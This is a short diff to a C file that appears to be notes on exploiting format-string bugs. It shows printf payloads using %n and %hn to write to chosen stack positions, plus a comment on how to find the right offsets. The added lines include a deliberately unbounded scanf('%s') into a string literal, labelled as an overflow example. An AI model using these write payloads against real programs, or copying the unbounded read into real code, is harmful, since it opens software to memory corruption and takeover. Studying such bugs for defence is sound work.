@@ -1,4 +1,5 @@
 #include <stdlib.h>
+#include <stdio.h>
 
 int main () {
 // each output of printf is the next output on the stack
@@ -27,6 +28,10 @@ printf("420%69x%13$n");
 // payload += %<address 2 stack position>$hn
 printf("CAAAAAAAA%412x%12$hn%61x%13$hn");
 printf("CAAAAAAAA%00000x%12$hp%00000x%13$hp"); // for finding the correct stack offset (replace 12 and 13)
+
+// scanf reads characters until terminator, no terminator causes overflow
+char *vuln = "example";
+scanf("%s", vuln);
 
 
 }
